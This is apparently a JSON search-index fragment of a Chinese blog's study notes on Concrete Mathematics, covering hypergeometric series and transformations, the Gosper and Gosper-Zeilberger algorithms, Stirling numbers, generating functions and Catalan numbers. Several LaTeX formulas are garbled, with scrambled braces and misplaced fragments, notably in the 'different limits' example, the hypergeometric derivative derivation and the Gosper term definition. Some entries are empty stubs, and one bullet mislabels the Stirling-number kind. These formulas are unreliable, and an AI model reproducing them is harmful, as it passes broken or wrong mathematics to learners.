<p>\u4f7f\u7528 (5.87) \u5c06\u8d1f\u53d8\u91cf\u9636\u4e58\u548c\u6b63\u7684\u4f3d\u9a6c\u51fd\u6570\u8054\u7cfb\u8d77\u6765</p> <p>\u6700\u540e\u4e00\u6b65\u4f7f\u7528\u6d1b\u5fc5\u8fbe $$ \\lim_{r \\to 0}\\frac{(-n-r)!\\Gamma(n+r)}{(-2n - 2r)!\\Gamma(2n+2r)} = \\lim_{r \\to 0}\\frac{\\sin(2n+2r)\\pi}{\\sin(n+r)\\pi} = 2(-1)^n $$ \u5f97 $$ \\lim_{x \\to -n} \\frac{x!}{(2x)!} = \\lim_{r \\to 0}\\frac{(-n-r)!}{(-2n - 2r)!} = 2(-1)^n \\frac{\\Gamma(2n)}{\\Gamma(n)} = (-1)^n\\frac{(2n)!}{n!} $$</p> </li> </ul> <p>\u4e0d\u540c\u6781\u9650</p> <p>\u7531 (5.20)\\(\\sum_{k \\leqslant m}{m+k \\choose k} 2^{-k}=2^{m} \\to \\sum_{k\\ge 0}{2m-k \\choose m-k}2^k = 2^{2m}\\)</p> <p>\u5e94\u8be5\u8868\u793a\u4e3a $$ \\begin{equation} \\left(\\begin{array}{c} 2 m \\ m \\end{array}\\right) \\lim {\\varepsilon \\rightarrow \\infty} F\\left(\\begin{array}{c} 1,-m \\ -2 m+\\varepsilon \\end{array} \\mid 2\\right)=2^{2 m} \\end{equation} $$ \u4e0d\u540c\u6781\u9650\u662f\u4e0d\u540c\u7684 $$ \\begin{equation} \\begin{aligned} \\lim  -1+\\varepsilon,-3 \\ -2+\\varepsilon \\end{array} \\mid 1\\right)=\\lim } F\\left(\\begin{array}{c{\\varepsilon \\rightarrow 0}\\left(1+\\frac{(-1+\\varepsilon)(-3)}{(-2+\\varepsilon) 1 !}+\\frac{(-1+\\varepsilon)(\\varepsilon)(-3)(-2)}{(-2+\\varepsilon)(-1+\\varepsilon) 2 !}\\right.\\ \\left.+\\frac{(-1+\\varepsilon)(\\varepsilon)(1+\\varepsilon)(-3)(-2)(-1)}{(-2+\\varepsilon)(-1+\\varepsilon)(\\varepsilon) 3 !}\\right) \\ =1-\\frac{3}{2}+0+\\frac{1}{2}=0 ; \\ \\lim  -1,-3 \\ -2+\\varepsilon \\end{array}\\right) =\\lim _{\\varepsilon \\rightarrow 0}\\left(1+\\frac{(-1)(-3)}{(-2+\\varepsilon) 1 !}+0+0\\right) \\ =1-\\frac{3}{2}+0+0=-\\frac{1}{2} . \\end{aligned} \\end{equation} $$} F\\left(\\begin{array}{l</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u8d85\u51e0\u4f55\u53d8\u6362","title":"\u8d85\u51e0\u4f55\u53d8\u6362","text":"<p>\u5df2\u77e5\u7684\u8d85\u51e0\u4f55\u7ea7\u6570\u5c01\u95ed\u5f62\u5f0f\u662f\u8ba1\u7b97\u4e8c\u9879\u5f0f\u7cfb\u6570\u548c\u7684\u6709\u7528\u5de5\u5177\u3002</p> <p>\u800c\u8d85\u51e0\u4f55\u53d8\u6362\u7814\u7a76\u5982\u4f55\u5c06\u4e00\u4e2a\u8d85\u51e0\u4f55\u7ea7\u6570\u53d8\u6362\u6210\u53e6\u4e00\u4e2a\u7c7b\u4f3c\u4f46\u4e0d\u540c\u53c2\u6570\u7684\u8d85\u51e0\u4f55\u7ea7\u6570\u3002</p> <p>1797 \u5e74\uff0cJ. F. \u666e\u6cd5\u592b [292] \u53d1\u73b0\u4e86\u4e00\u4e2a\u60ca\u4eba\u7684\u53cd\u5c04\u5b9a\u5f8b\uff08reflection law\uff09 $$ \\frac{1}{(1-z)^{a}} F\\left(\\begin{array}{c|c} a, b &amp; -z \\ c &amp; 1-z \\end{array}\\right)=F\\left(\\left.\\begin{array}{c} a, c-b \\ c \\end{array}\\right| z\\right) $$</p> <p>\u5fae\u5206\u65b9\u5f0f\u5f97\u5230 $$ \\begin{equation}     \\begin{aligned}     &amp;\\frac{d}{d z} F\\left(\\begin{array}{l}     a_{1}, \\cdots, a_{m} \\     b_{1}, \\cdots, b_{n}     \\end{array} \\mid z\\right)=\\sum_{k \\geqslant 1} \\frac{a_{1}^{\\bar{k}} \\cdots a_{m}^{\\bar{k}} z<sup>{k-1}}{b_{1}</sup>\\     &amp;=\\sum_{k+1 \\geqslant 1} \\frac{a_{1}^{\\overline{k+1}} \\cdots a_{m}^{\\overline{k+1}} z}} \\cdots b_{n}^{\\bar{k}}(k-1) !<sup>{k}}{b_{1}</sup>\\     &amp;=\\sum_{k \\geqslant 0} \\frac{a_{1}\\left(a_{1}+1\\right)^{\\bar{k}} \\cdots a_{m}\\left(a_{m}+1\\right)^{\\bar{k}} z}} \\cdots b_{n}^{\\overline{k+1}} k !<sup>{k}}{b_{1}\\left(b_{1}+1\\right)</sup>\\     &amp;=\\frac{a_{1} \\ldots a_{m}}{b_{1} \\ldots b_{n}} F\\left(\\begin{array}{ll}     a_{1}+1, \\ldots, &amp; a_{m}+1 \\     b_{1}+1, \\ldots, &amp; b_{n}+1     \\end{array} \\mid z\\right) \\text {. }     \\end{aligned} \\end{equation} $$}} \\cdots b_{n}\\left(b_{n}+1\\right)^{\\bar{k}} k !</p> <p>\u53e6\u4e00\u4e2a\u7b97\u5b50 $$ \\vartheta = z\\frac{d}{d z} $$</p> \\[ \\begin{equation} \\begin{aligned} \\left(\\vartheta+a_{1}\\right) F\\left(\\begin{array}{c} a_{1}, \\cdots, a_{m} \\\\ b_{1}, \\cdots, b_{n} \\end{array} \\mid z\\right) &amp;=\\sum_{k \\geqslant 0} \\frac{\\left(k+a_{1}\\right) a_{1}^{\\bar{k}} \\cdots a_{m}^{\\bar{k}} z^{k}}{b_{1}^{\\bar{k}} \\cdots b_{n}^{\\bar{k}} k !} \\\\ &amp;=\\sum_{k \\geqslant 0} \\frac{a_{1}\\left(a_{1}+1\\right)^{\\bar{k}} a_{2}^{\\bar{k}} \\cdots a_{m}^{\\bar{k}} z^{k}}{b_{1}^{\\bar{k}} \\cdots b_{n}^{\\bar{k}} k !} \\\\ &amp;=a_{1} F\\left(\\left.\\begin{array}{c} a_{1}+1, a_{2}, \\cdots, a_{m} \\\\ b_{1}, \\cdots, b_{n} \\end{array}\\right| z \\right) \\end{aligned} \\end{equation} \\] \\[ \\begin{equation} \\begin{aligned} \\left(\\vartheta+b_{1}-1\\right) F\\left(\\begin{array}{c} a_{1}, \\cdots, a_{m} \\\\ b_{1}, \\cdots, b_{n} \\end{array} \\mid z\\right) &amp;=\\sum_{k \\geqslant 0} \\frac{\\left(k+b_{1}-1\\right) a_{1}^{\\bar{k}} \\cdots a_{m}^{\\bar{k}} z^{k}}{b_{1}^{\\bar{k}} \\cdots b_{n}^{\\bar{k}} k !} \\\\ &amp;=\\sum_{k \\geqslant 0} \\frac{\\left(b_{1}-1\\right) a_{1}^{\\bar{k}} \\cdots a_{m}^{\\vec{k}} z^{k}}{\\left(b_{1}-1\\right)^{\\bar{k}} b_{2}^{\\bar{k}} \\cdots b_{n}^{\\bar{k}} k !} \\\\ &amp;\\left.=\\left(b_{1}-1\\right) F\\left(\\begin{array}{c} a_{1}, \\cdots, a_{m} \\\\ b_{1}-1, b_{2}, \\cdots, b_{n} \\end{array}\\right| z\\right) \\end{aligned} \\end{equation} \\] <p>\u4e8e\u662f\u8d85\u51e0\u4f55\u51fd\u6570\u6ee1\u8db3\u5fae\u5206\u65b9\u7a0b\uff0c\u4e14\u662f\u4ec5\u6709\u7684\u6ee1\u8db3\u8be5\u5fae\u5206\u65b9\u7a0b\u5e38\u6570\u9879\u4e3a 1 \u7684\u5f62\u5f0f\u5e42\u7ea7\u6570 $$ \\begin{equation} \\mathrm{D}\\left(\\vartheta+b_{1}-1\\right) \\cdots\\left(\\vartheta+b_{n}-1\\right) F=\\left(\\vartheta+a_{1}\\right) \\cdots\\left(\\vartheta+a_{m}\\right) F, \\end{equation} $$</p> <p>F(a, b; c; z) \u6ee1\u8db3 $$ \\begin{equation} z(1-z) F^{\\prime \\prime}(z)+(c-z(a+b+1)) F^{\\prime}(z)-a b F(z)=0 \\end{equation} $$ \u5fae\u5206\u7406\u8bba\u7684\u4e00\u4e2a\u7528\u9014\u662f\u53d1\u73b0\u5e76\u8bc1\u660e\u65b0\u7684\u53d8\u6362\uff0c\u5982\u9ad8\u65af\u6052\u7b49\u5f0f\uff0c\u5747\u6ee1\u8db3\u76f8\u540c\u7684\u5fae\u5206\u65b9\u7a0b\u3002 $$ \\begin{equation}     \\left.\\left.F\\left(\\begin{array}{c}     2 a, 2 b \\     a+b+\\frac{1}{2}     \\end{array}\\right| z\\right)=F\\left(\\begin{array}{c}     a, b \\     a+b+\\frac{1}{2}     \\end{array}\\right| 4 z(1-z)\\right) \\end{equation} $$</p> <p>\u8d85\u51e0\u4f55\u7ea7\u6570\u5bf9\u4e8e\u7406\u89e3\u4e8c\u9879\u5f0f\u7cfb\u6570 \u548c\u5f0f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9ad8\u6c34\u5e73\u7684\u65b9\u6cd5\uff0e\u66f4\u591a\u7684\u4fe1\u606f\u53ef\u4ee5\u5728 Bailey \u6240\u5199\u7684\u7ecf\u5178\u8457\u4f5c [18] \u4ee5\u53ca\u5176\u540e\u7531 Gasper \u548c Rahman \u5408\u8457\u7684\u4e66 [141] \u4e2d\u627e\u5230</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#gosper-\u7b97\u6cd5-\u6c42\u5dee\u5206\u539f\u51fd\u6570","title":"Gosper \u7b97\u6cd5 (\u6c42\u5dee\u5206\u539f\u51fd\u6570)","text":"<p>1977 \u5e74\uff0cR. W. Gosper \\({ }^{[154]}\\) \u53d1\u73b0\u4e86\u4e00\u4e2a\u4f18\u7f8e\u7684\u65b9\u6cd5\uff0c\u53ea\u8981 \\(f\\) \u548c \\(g\\) \u5c5e\u4e8e\u79f0\u4e3a\u8d85\u51e0\u4f55\u9879\u7684\u4e00\u822c \u51fd\u6570\u7c7b\uff0c\u5c31\u80fd\u7528\u6b64\u6cd5\u6c42\u51fa\u4e0d\u5b9a\u548c\u5f0f \\(\\sum f(k) \\delta k=g(k)+C\\). \u6211\u4eec\u8bb0 $$ F\\left(\\begin{array}{c} a_{1}, \\cdots, a_{m} \\ b_{1}, \\cdots, b_{n} \\end{array} \\mid z\\right){k}=\\frac{a}^{\\bar{k}} \\cdots a_{m<sup>{\\bar{k}}}{b_{1}</sup> $$ \u4e3a\u8d85\u51e0\u4f55\u7ea7\u6570 }} \\cdots b_{n}^{\\bar{k}}} \\frac{z^{k}}{k !\\(F\\left(a_{1}, \\cdots, a_{m} ; b_{1}, \\cdots, b_{n} ; z\\right)\\) \u7684\u7b2c \\(k\\) \u9879\u3002\u6211\u4eec\u5c06\u628a \\(\\left.F\\left(a_{1}, \\cdots, a_{m} ; b_{1}, \\cdots, b_{n} ; z\\right)\\right._{k}\\) \u770b\u6210\u662f \\(k\\) \u800c \u4e0d\u662f \\(z\\) \u7684\u4e00\u4e2a\u51fd\u6570\u3002\u5728\u8bb8\u591a\u60c5\u5f62\u4e0b\u90fd\u8868\u660e\uff0c\u5bf9\u7ed9\u5b9a\u7684 \\(a_{1}, \\cdots, a_{m}, b_{1}, \\cdots, b_{n}\\) \u4ee5\u53ca \\(z\\), \u5b58\u5728\u53c2\u6570 \\(c\\), \\(A_{1}, \\cdots, A_{M}, B_{1}, \\cdots, B_{N}\\) \u4ee5\u53ca \\(Z\\), \u4f7f\u5f97 $$ \\sum F\\left(\\begin{array}{l} a_{1}, \\cdots, a_{m} \\ b_{1}, \\cdots, b_{n} \\end{array} \\mid z\\right){k} \\delta k=c F\\left(\\begin{array}{l} A \\ B_{1}, \\cdots, B_{N} \\end{array} \\mid Z\\right)_{k}+C . $$ \u5b58\u5728\u79f0\u4e3a\u662f\u53ef\u7528\u8d85\u51e0\u4f55\u9879\u6c42\u548c\u7684 (summable in hypergeometric terms )}, \\cdots, A_{M</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#gosper-zeilberger-\u7b97\u6cd5","title":"Gosper-Zeilberger \u7b97\u6cd5","text":"<p>\\(t(n, k)\\). \u5f53 \\(t(n, k)\\) \u7ed9\u5b9a\u65f6\uff0cGosper-Zeilberger \u7b97\u6cd5\u53ef\u4ee5\u603b\u7ed3\u5982\u4e0b\uff1a 0 \u7f6e \\(l:=0\\). ( \u6211\u4eec\u5c06\u5bfb\u6c42\u5173\u4e8e \\(n\\) \u7684 \\(l\\) \u9636\u9012\u5f52\u5f0f\u3002) 1 \u4ee4 \\(\\hat{t}(n, k)=\\beta_{0}(n) t(n, k)+\\cdots+\\beta_{l}(n) t(n+l, k)\\), \u5176\u4e2d \\(\\beta_{0}(n), \\cdots, \\beta_{l}(n)\\) \u662f\u672b\u77e5\u7684\u51fd\u6570\u3002\u5229\u7528 \\(t(n, k)\\) \u7684\u6027\u8d28\u5bfb\u6c42 \\(\\beta_{0}(n), \\cdots, \\beta_{l}(n)\\) \u7684\u4e00\u4e2a\u7ebf\u6027\u7ec4\u5408 \\(p(n, k)\\), \u5176\u7cfb\u6570\u662f\u5173\u4e8e \\(n\\) \u548c \\(k\\) \u7684\u591a\u9879\u5f0f\uff0c\u4f7f \u5f97 \\(\\hat{t}(n, k)\\) \u53ef\u4ee5\u5199\u6210\u5f62\u5f0f \\(p(n, k) \\bar{t}(n, k)\\), \u5176\u4e2d \\(\\bar{t}(n, k)\\) \u662f\u5173\u4e8e \\(k\\) \u7684\u8d85\u51e0\u4f55\u9879\u3002\u6c42\u591a\u9879\u5f0f \\(\\bar{p}(n, k)\\) \u3001 \\(q(n, k)\\) \u548c \\(r(n, k)\\), \u4f7f\u5f97 \\(\\bar{t}(n, k)\\) \u7684\u9879\u7684\u6bd4\u503c\u8868\u793a\u6210 \\((5.128)\\) \u7684\u5f62\u5f0f\uff0c\u5176\u4e2d \\(q(n, k)\\) \u548c \\(r(n, k)\\) \u6ee1\u8db3 Gosper \u6761\u4ef6 ( \\(5.118)\\). \u7f6e \\(\\hat{p}(n, k)=p(n, k) \\bar{p}(n, k)\\). 2a \u7f6e \\(d_{Q}:=\\operatorname{deg}(q-r), d_{R}:=\\operatorname{deg}(q+r)\\), \u4ee5\u53ca $$ d:= \\begin{cases}\\operatorname{deg}(\\hat{p})-d_{Q}, &amp; d_{Q} \\geqslant d_{R} \\ \\operatorname{deg}(\\hat{p})-d_{R}+1, &amp; d_{Q}&lt;d_{R}\\end{cases} $$ \\(2 \\mathrm{~b}\\) \u5982\u679c \\(d \\geqslant 0\\), \u7528 \\((5.130)\\) \u5b9a\u4e49 \\(s(n, k)\\), \u5e76\u8003\u8651\u5173\u4e8e \\(\\alpha_{0}, \\cdots, \\alpha_{d}, \\beta_{0}, \\cdots, \\beta_{l}\\) \u7684\u8bf8\u4e2a\u7ebf\u6027\u65b9 \u7a0b\uff0c\u8fd9\u4e9b\u65b9\u7a0b\u662f\u5728\u57fa\u672c\u65b9\u7a0b ( 5.129) \u4e2d\u4ee4 \\(k\\) \u7684\u5e42\u7684\u7cfb\u6570\u76f8\u7b49\u800c\u5f97\u5230\u7684\u3002\u5982\u679c\u8fd9\u4e9b\u65b9\u7a0b\u6709\u4e00\u4e2a \u4f7f\u5f97 \\(\\beta_{0}, \\cdots, \\beta_{l}\\) \u4e0d\u5168\u4e3a\u96f6\u7684\u89e3\uff0c\u5c31\u8f6c\u5230\u7b2c 4 \u6b65\u3002\u5982\u82e5\u4e0d\u7136\uff0c\u5f53 \\(d_{Q}&lt;d_{R}\\) \u4e14 \\(-2 \\lambda^{\\prime} / \\lambda\\) \u662f\u4e00\u4e2a\u5927\u4e8e \\(d\\) \u7684 \u6574\u6570\u65f6 (\u5176\u4e2d \\(\\lambda\\) \u662f \\(q+r\\) \u4e2d \\(k^{d_{R}}\\) \u7684\u7cfb\u6570\uff0c\u800c \\(\\lambda^{\\prime}\\) \u5219\u662f \\(q-r\\) \u4e2d \\(k^{d_{R}-1}\\) \u7684\u7cfb\u6570 ), \u5c31\u7f6e \\(d:=-2 \\lambda^{\\prime} / \\lambda\\) \u5e76 \u91cd\u590d\u7b2c \\(2 \\mathrm{~b}\\) \u6b65\u3002 3 ( \u9879 \\(\\hat{t}(n, k)\\) \u4e0d\u662f\u8d85\u51e0\u4f55\u53ef\u6c42\u548c\u7684\u3002) \u5c06 \\(l\\) \u589e\u52a0 1 \u5e76\u56de\u5230\u7b2c 1 \u6b65\u3002 4\uff08\u6210\u529f\u3002) \u7f6e \\(T(n, k):=r(n, k) s(n, k) \\bar{t}(n, k) / \\bar{p}(n, k)\\). \u7531\u8be5\u7b97\u6cd5\uff0c\u5c31\u5f97\u5230\u4e86 \\(\\hat{t}(n, k)=T(n\\), \\(k+1)-T(n, k) .\\) \u4ee5\u540e\u6211\u4eec\u5c06\u8981\u8bc1\u660e\uff0c\u53ea\u8981 \\(t(n, k)\\) \u5c5e\u4e8e\u79f0\u4e3a\u6b63\u5e38\u9879\uff08proper term\uff09\u7684\u4e00\u4e2a\u5927\u7c7b\uff0c\u8fd9\u4e2a\u7b97\u6cd5 \u5c31\u80fd\u6210\u529f\u5730\u7ec8\u6b62\u3002</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#6-\u7279\u6b8a\u7684\u6570","title":"6 \u7279\u6b8a\u7684\u6570","text":"<ul> <li> <p>\u7b2c\u4e8c\u7c7b\u65af\u7279\u6797\u6570\uff08n \u771f\u5b50\u96c6 k\uff09</p> <p>$$   {n \\brace k} = {n - 1 \\brace k-1} + k{n-1 \\brace k}   $$</p> <p>\u5206\u522b\u8ba8\u8bba\u7b2c\u4e00\u4e2a\u6570\uff1a1\uff09\u5355\u72ec\u6210\u4e3a\u4e00\u4e2a\u5b50\u96c6\u30022\uff09\u4ece\\({n-1 \\brace k}\\)\u4e2d\u9009\u62e9\u4e00\u4e2a\uff0c\u6709 k \u79cd\u53ef\u80fd</p> <ul> <li>\u7279\u503c<p>\\({n \\brace 2} = 2^{n-1}-1\\)</p> </li> </ul> </li> </ul> <ul> <li> <p>\u7b2c\u4e00\u7c7b stirling \u6570\uff08n \u8f6e\u6362 k\uff09\uff08\u5728 n \u5b50\u96c6 k \u7684\u6bcf\u4e2a\u5b50\u96c6\u4e0a\uff0c\u4e58\u4e0a\u8f6e\u6362\u7684\u79cd\u7c7b\uff09</p> <p>$$   {n \\brack k} = {n - 1 \\brack k-1} + (n-1){n-1 \\brack k}   $$</p> <p>\u5206\u522b\u8ba8\u8bba\u7b2c\u4e00\u4e2a\u6570\uff1a1\uff09\u5355\u72ec\u6210\u4e3a\u4e00\u4e2a\u5b50\u96c6\u30022\uff09\u4ece\\({n-1 \\brack k}\\)\u4e2d\u9009\u62e9\u4e00\u4e2a\uff0c\\(t_1 +t_2+...+t_k = n-1\\)\uff0c\u52a0\u5165\\(t_i\\)\u4e2a\u5143\u7d20\u7684\u8f6e\u6362\u65f6\uff0c\u79cd\u6570\u4e3a\\(t_i{n-1 \\brack k}\\)</p> <ul> <li>\u7279\u6b8a\u503c<p>\\({n \\brack 1} = (n-1)![n&gt;0]\\)</p> <p>\\({n \\brack 2} = (n-1)!H_{n-1}[n&gt;0]\\)</p> </li> </ul> </li> </ul> <ul> <li> <p>\u7b2c\u4e00\u7c7b stirling \u6570\u548c\u6392\u5217\u5173\u7cfb</p> <ul> <li> <p>\u4e00\u4e2a\u6392\u5217\u5bf9\u5e94\u4e00\u4e2a\u8f6e\u6362</p> <ul> <li>\u6392\u5217\\(\\pi_1\\pi_2...\\pi_n\\)\uff0c\u8868\u793a\u5c06\\(i \\to \\pi_i\\)\u3002\u4ece\u4efb\u4e00\u4e2a\u5143\u7d20\u51fa\u53d1\uff0c\u6620\u5c04\u53ef\u4ee5\u6784\u6210\u4e00\u4e2a\u73af\u3002\\(m_0 = m, m_k = \\pi_{m_{k-1}}\\)</li> </ul> </li> </ul> <ul> <li>\u4e00\u4e2a\u8f6e\u6362\u4e5f\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u6392\u5217\uff0c\u56e0\u6b64   $$   \\sum_k {n \\brack k} = n!   $$</li> </ul> </li> </ul> <ul> <li>stirling \u6570\u4e0e\u4e0b\u964d\u5e42   $$   x^n = \\sum_k {n \\brace k}x^{\\underline{k}}, n\\ge 0   $$</li> </ul> <ul> <li>\u7b2c\u4e8c\u7c7b stirling \u6570\u4e0e\u4e0a\u5347\u5e42   $$   x^{\\bar{n}} = \\sum_k {n \\brack k}x^k, n\\ge 0   $$</li> </ul> <ul> <li> <p>\u5bf9\u5076\u6027</p> <p>\u5c06 stirling \u6570\u5bf9 n,k \u4e0d\u505a\u4efb\u4f55\u9650\u5236\u540e (\u52a0\u4e0a\u6761\u4ef6\\({0 \\brace k} = [k=0], {n\\brace 0} = [n=0]\\)) \u53ef\u5f97 $$ {n \\brack k} = {-k \\brace -n} $$</p> </li> </ul> <ul> <li></li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6b27\u62c9\u6570","title":"\u6b27\u62c9\u6570","text":"<ul> <li>\\({n }\\)</li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#7-\u751f\u6210\u51fd\u6570","title":"7 \u751f\u6210\u51fd\u6570","text":"<p>\u4ece\u4e4b\u540e\u6765\u770b\uff0c\u751f\u6210\u51fd\u6570\u5c31\u662f\u4e00\u4e2a\u548c\u5f0f\uff0c\u5305\u542b\u5173\u4e8e\u7814\u7a76\u95ee\u9898\u7684\u5168\u90e8\u4fe1\u606f\uff08\u8d34\u74f7\u7816\uff0c\u6982\u7387\u5206\u5e03\u3002\u3002\u3002\uff09</p> <ul> <li>\u591a\u7c73\u8bfa\u94fa\u8bbe\uff0c\u751f\u6210\u51fd\u6570\u8bbe\u7f6e\u4e3a\u6240\u6709\u94fa\u8bbe<ul> <li>\u5ffd\u7565\u94fa\u8bbe\u65b9\u5f0f\uff08\u6253\u6563\u6210\u96f6\u4ef6\uff09\uff0c\u53ea\u8003\u8651\u4f7f\u7528\u7684\u884c\u5217\u591a\u7c73\u8bfa\u6570\u91cf</li> <li>\u53ea\u8003\u8651\u591a\u7c73\u8bfa\u9aa8\u724c\u7684\u6570\u91cf\uff1a\u6bcf\u4e00\u9879\u7cfb\u6570\u4e3a 3xn(\u6216 2xn) \u94fa\u8bbe\u5728\u6307\u5b9a\u6570\u91cf\u9aa8\u724c\u65f6\u7684\u65b9\u5f0f\u603b\u6570\u3002</li> </ul> </li> <li>\u627e\u786c\u5e01<ul> <li>\\([z^n]\\frac{1}{1-z}\\frac{1}{1-z^5}...\\frac{1}{1-z^{50}}\\)</li> <li>\u4e66\u4e0a\u901a\u8fc7\u8f6c\u6362\u6210\u9012\u5f52\u5f0f\u6c42\u89e3</li> </ul> </li> <li>7.2 \u751f\u6210\u51fd\u6570\u53d8\u6362<ul> <li>\\(F(z) = \\sum_n f_nz^n\\)\uff0c\u5ef6\u62d3\u5230\\(n \\in Z, n&lt;0 \\to f_n=0\\)</li> <li>\u751f\u6210\u51fd\u6570\u53d8\u6362<ul> <li>\\(&lt;\\alpha f_n+\\beta g_n&gt; \\to \\alpha F(z) + \\beta G(z)\\)</li> <li>\\(&lt;0, 0,...,0_m, g_0, g_1,..&gt;\\)  \u6216\\(&lt;g_{n-m}&gt;\\)</li> <li>\\(&lt;g_{n+m}&gt;\\)</li> <li>\\(&lt;ng_n&gt;\\)\uff0c\u6c42\u5bfc\uff0c\\(zG'(z)\\)<ul> <li>\\(n^2 g_n\\)?</li> </ul> </li> <li>\\(&lt;\\frac{1}{n}g_n&gt;\\)\uff0c\u6c42\u79ef\u5206</li> <li>\u5377\u79ef\uff1a\\(F(z)G(z) = \\sum_n(\\sum_k g_k f_{n-k})z^n\\)</li> </ul> </li> </ul> </li> <li>\u751f\u6210\u51fd\u6570\u6c42\u6590\u6ce2\u90a3\u5951\u6570\u5217<ul> <li>\\(f_0=0,f_1=1, f_n = f_{n-1} +f_{n-2}, n\\ge 1\\)</li> <li>\\(f_n = f_{n-1} +f_{n-2} + [n=1], n\\in Z\\)</li> <li>\\(G(z) = \\frac{z}{1-z-z^2} = \\frac{1}{\\sqrt{5}}(\\frac{1}{1-\\alpha z} - \\frac{1}{1-\\beta z})\\)</li> <li>\u6d89\u53ca\u5230\u6709\u7406\u51fd\u6570\u5206\u89e3</li> </ul> </li> <li>7.3 \u89e3\u9012\u63a8\u5f0f<ul> <li>\u6709\u7406\u51fd\u6570\u5206\u89e3</li> <li>\u76f8\u4e92\u9012\u63a8\u6570\u5217 -&gt; \u4e8c\u5143\u4e00\u6b21\u65b9\u7a0b\u7ec4</li> <li>\\(g_0 = 1, g_n = ng_{n-1}, n\\ge 1\\)<ul> <li>\\(G(z) = z^2G'(z) + zG(z) + 1\\)</li> <li>\u8d85\u51e0\u4f55\u7ea7\u6570\uff0c\u662f\u6ee1\u8db3 xxxx\uff0c\u4e14\u662f\u552f\u4e00\u6ee1\u8db3\u8be5\u65b9\u7a0b\u4e14\u5e38\u6570\u9879\u4e3a 1 \u7684\u5e42\u7ea7\u6570\u3002</li> </ul> </li> <li>\u4e8c\u91cd\u6c42\u548c<ul> <li>\\(f_n = f_{n-1} + \\sum_{k&lt;n}f_k + 1\\)</li> </ul> </li> </ul> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6709\u7406\u51fd\u6570\u5206\u89e3","title":"\u6709\u7406\u51fd\u6570\u5206\u89e3","text":"<ul> <li> <p>\u7279\u6b8a\u7684\u751f\u6210\u51fd\u6570</p> <ul> <li>aa   </li> </ul> </li> </ul> <ul> <li> <p>\u5377\u79ef</p> <ul> <li>bb   </li> </ul> <ul> <li>aa   </li> </ul> </li> </ul> <ul> <li>\u751f\u6210\u51fd\u6570\u89e3\u751f\u6210\u6811\u95ee\u9898</li> <li>\u5361\u5854\u5170\u6570</li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5361\u5854\u5170\u6570","title":"\u5361\u5854\u5170\u6570","text":"<p>\u8bc1\u660e 1\uff1a</p> <ul> <li> <p>ranny \u5f15\u7406</p> <p>&lt;\\(x_1, x_2, ..., x_n\\)&gt;\u548c\u4e3a 1 \u7684\u6574\u6570\u6570\u5217\uff0c\u5219\u53ea\u6709\u4e00\u4e2a\u5faa\u73af\u79fb\u4f4d\u6ee1\u8db3\u6240\u6709\u524d\u90e8\u5206\u548c\u4e3a\u6b63\u3002</p> </li> </ul> <ul> <li> <p>\u95ee\u9898\uff1a\u4ece 0 \u8d70\u5230 n \u7684\u8d70\u6cd5</p> <p></p> </li> </ul> <ul> <li> <p>\u8f6c\u6362\u4e3a\uff1a</p> <ul> <li>&lt;\\(x_1, x_2, ..., x_{2n}\\)&gt;, \\(x_i = \\pm 1\\)</li> <li>\\(\\sum x_i = 0\\)</li> <li>\u90e8\u5206\u548c\u975e\u8d1f</li> <li>\u6784\u9020</li> <li></li> </ul> </li> </ul> <p>\u8bc1\u660e 2\uff1a</p> <p>\u4ece 0 \u5230 n\uff0c\u9700\u8981 n \u6b21\u53f3\u4e0a\uff0cn \u6b21\u53f3\u4e0b\u79fb\u52a8\uff0c\u6709\\({2n \\choose n}\\)\u79cd\u8d70\u6cd5\uff0c\u51cf\u53bb\u5176\u4e2d\u51fa\u73b0\u90e8\u5206\u548c\u4e3a\u8d1f\u7684\u60c5\u5f62</p> <p>\u90e8\u5206\u548c\u4e3a\u8d1f\u7684\u60c5\u5f62\uff0c\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u53cd\u5c04\u7684\u8d70\u6cd5\uff0c\\({2n \\choose n-1}\\)</p> <p>\\(C_n = {2n \\choose n} - {2n \\choose n-1}\\)</p> <p>\u8bc1\u660e 3\uff1a</p> <p>\u5f15\u7406\uff1a\\(C_k^{(t, 1)} = (\\sum_{k_1 + k_2 +...k_t = k-1}C_{k_1}^{(t,1)}...) + [k=0]\\)</p> <p>\u5176\u4e2d\\(C_k^{(t, r)} = {tk + r \\choose k} \\frac{r}{tk + r}\\)</p> <p>\u8bc1\u660e</p> <p>\u8003\u8651\u7531 1 \u548c (1-m) \u6784\u6210\u7684\u90e8\u5206\u548c\u4e3a\u6b63\u7684\uff0c\u603b\u548c\u4e3a 1 \u7684\u6570\u5217\uff0c\u79f0\u4e3a m-Ranmy \u6570\u5217</p> 